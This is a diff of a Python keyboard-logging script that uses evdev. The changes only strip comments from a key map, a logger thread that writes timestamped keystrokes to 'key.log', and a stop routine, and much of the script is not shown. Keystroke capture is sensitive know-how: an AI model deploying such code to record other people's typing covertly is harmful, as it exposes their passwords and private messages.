@@ -1,9 +1,8 @@
 from evdev import InputDevice, categorize, ecodes, list_devices
 from datetime import datetime
 import threading
-import time  # Add this import
+import time  
 
-# ================== MAPS ==================
 normal_map = {
     "KEY_A": "a", "KEY_B": "b", "KEY_C": "c", "KEY_D": "d",
     "KEY_E": "e", "KEY_F": "f", "KEY_G": "g", "KEY_H": "h",
@@ -24,7 +23,6 @@ normal_map = {
     "KEY_COMMA": ",", "KEY_DOT": ".", "KEY_SLASH": "/",
     "KEY_TAB": "\t", "KEY_ENTER": "\n",
 
-    # Numpad
     "KEY_KP0": "0", "KEY_KP1": "1", "KEY_KP2": "2", "KEY_KP3": "3",
     "KEY_KP4": "4", "KEY_KP5": "5", "KEY_KP6": "6", "KEY_KP7": "7",
     "KEY_KP8": "8", "KEY_KP9": "9", "KEY_KPDOT": ".", "KEY_KPPLUS": "+",
@@ -79,7 +77,7 @@ def start_logger(log_file="key.log"):
         f.write(f"--- Start: {timestamp} ---\n")
 
     def logging_thread():
-        dev = logger_device  # capture reference
+        dev = logger_device 
         try:
             print(f"[KL] Key Logger started on {dev.path} - {dev.name}")
 
@@ -147,10 +145,9 @@ def stop_logger():
     if logger_stop_event:
         logger_stop_event.set()
         if logger_thread and logger_thread.is_alive():
-            logger_thread.join(timeout=5.0)  # Give more time to flush
+            logger_thread.join(timeout=5.0) 
         logger_stop_event = None
         logger_thread = None
-        # Small delay to ensure file is flushed
         time.sleep(0.5)
 
 
